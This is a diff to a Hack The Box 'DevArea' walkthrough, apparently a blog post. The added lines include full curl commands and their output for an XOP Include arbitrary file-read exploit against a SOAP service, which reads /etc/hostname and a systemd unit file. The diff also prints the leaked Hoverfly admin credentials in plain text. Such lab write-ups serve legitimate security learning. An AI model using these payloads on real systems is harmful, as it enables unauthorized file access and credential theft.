@@ -418,7 +418,7 @@ Nmap done: 1 IP address (1 host up) scanned in 43.84 seconds
 
 ```
 
-The machine was clearly multi-service, so I started by checking FTP.
+The machine was clearly multi-service.
 
 ### Nmap commands explanations
 
@@ -440,7 +440,69 @@ I immediately ignored all structure, all logic, and all patience and dove headfi
 
 <img src="/public/assets/htb/devarea/alice-in-wonderland-tea-party.gif" width="500px" alt="rabbit-hole">
 
-### First victim: port 8080 (Jetty)
+I started applying the MCP (a.k.a. “Mensi Cybersecurity Principle”):
+
+✨**`The more you Fuck Around the more you gonna Find Out.`**✨
+
+![Alt text](../assets/htb/devarea/11.png)
+
+Which basically means:
+**touch everything, break nothing, understand nothing, and somehow still win.**
+
+---
+
+### First victim: discovering `devarea.htb` (because IPs are ugly)
+
+Before I even started messing with random ports, I opened port 80 and noticed the website branding screaming **DevArea**.
+
+So naturally I assumed the machine probably uses a hostname.
+
+I added this to my `/etc/hosts`:
+
+```bash
+sudo nano /etc/hosts
+```
+
+And inserted:
+
+```bash
+10.129.244.208 devarea.htb
+```
+
+Now instead of looking like a caveman typing raw IP addresses, I could browse like a civilized human:
+
+🔗 `http://devarea.htb`
+
+![Alt text](../assets/htb/devarea/12.png)
+
+Did this help?
+**Not really.**
+
+The website looked clean and “startup-ish”, but functionally it was basically a decorative HTML template.
+
+- Clicking buttons felt like clicking on **PNG images**
+- Most links either looped back to the homepage or did absolutely nothing
+- No login panel, no upload form, no API endpoints screaming for help
+- No obvious parameters to play with
+- No hidden directories found immediately
+
+It was the kind of website that exists only to say:
+
+> “Yes, we are a company.”
+
+Not to actually _do_ anything.
+
+But hey… at least now I was using `devarea.htb` instead of the raw IP like a caveman.
+
+So did it help?
+
+Still no.
+
+But it **felt professional**, and that’s what matters. 😭🔥
+
+![Alt text](../assets/htb/devarea/13.png)
+
+### Second victim: port 8080 (Jetty)
 
 Seeing Jetty running, I confidently assumed I’d find something useful at `/`.
 
@@ -727,7 +789,43 @@ Content-ID: <root@example.com>
 --MIMEBoundary--'
 ```
 
-![Alt text](../assets/htb/devarea/9.png)
+### Output
+
+```bash
+
+┌──(mensi㉿kali)-[~/Desktop]
+└─$ curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
+-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
+--data-binary $'--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: binary
+Content-ID: <root@example.com>
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+               xmlns:tns="http://devarea.htb/"
+               xmlns:xop="http://www.w3.org/2004/08/xop/include">
+  <soap:Body>
+    <tns:submitReport>
+      <arg0>
+        <confidential>false</confidential>
+        <content>
+          <xop:Include href="file:///etc/hostname"/>
+        </content>
+        <department>x</department>
+        <employeeName>x</employeeName>
+      </arg0>
+    </tns:submitReport>
+  </soap:Body>
+</soap:Envelope>
+
+--MIMEBoundary--'
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from x. Department: x. Content: ZGV2YXJlYQo=</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
+┌──(mensi㉿kali)-[~/Desktop]
+└─$ echo "ZGV2YXJlYQo=" | base64 -d
+devarea
+
+```
 
 returned Base64-encoded file contents.
 
@@ -795,12 +893,68 @@ Content-ID: <root@example.com>
 --MIMEBoundary--'
 ```
 
-![Alt text](../assets/htb/devarea/10.png)
+### Output
+
+```bash
+
+
+┌──(mensi㉿kali)-[~/Desktop]
+└─$ curl -s -X POST 'http://10.129.244.208:8080/employeeservice' \
+-H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
+--data-binary $'--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: binary
+Content-ID: <root@example.com>
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+               xmlns:tns="http://devarea.htb/"
+               xmlns:xop="http://www.w3.org/2004/08/xop/include">
+  <soap:Body>
+    <tns:submitReport>
+      <arg0>
+        <confidential>false</confidential>
+        <content>
+          <xop:Include href="file:////etc/systemd/system/hoverfly.service"/>
+        </content>
+        <department>x</department>
+        <employeeName>x</employeeName>
+      </arg0>
+    </tns:submitReport>
+  </soap:Body>
+</soap:Envelope>
+
+--MIMEBoundary--'
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from x. Department: x. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
+┌──(mensi㉿kali)-[~/Desktop]
+└─$ echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==" | base64 -d
+[Unit]
+Description=HoverFly service
+After=network.target
+
+[Service]
+User=dev_ryan
+Group=dev_ryan
+WorkingDirectory=/opt/HoverFly
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+
+Restart=on-failure
+RestartSec=5
+StartLimitIntervalSec=60
+StartLimitBurst=5
+LimitNOFILE=65536
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+
+```
 
 That gave me:
 
-- Hoverfly admin username
-- Hoverfly admin password
+- Hoverfly admin username : admin
+- Hoverfly admin password : O7IJ27MyyXiU
 - confirmation that Hoverfly was running on `8888`
 
 ---
@@ -812,6 +966,8 @@ Using the leaked credentials, I logged into:
 ```text
 http://devarea.htb:8888
 ```
+
+![Alt text](../assets/htb/devarea/14.png)
 
 The dashboard showed:
 
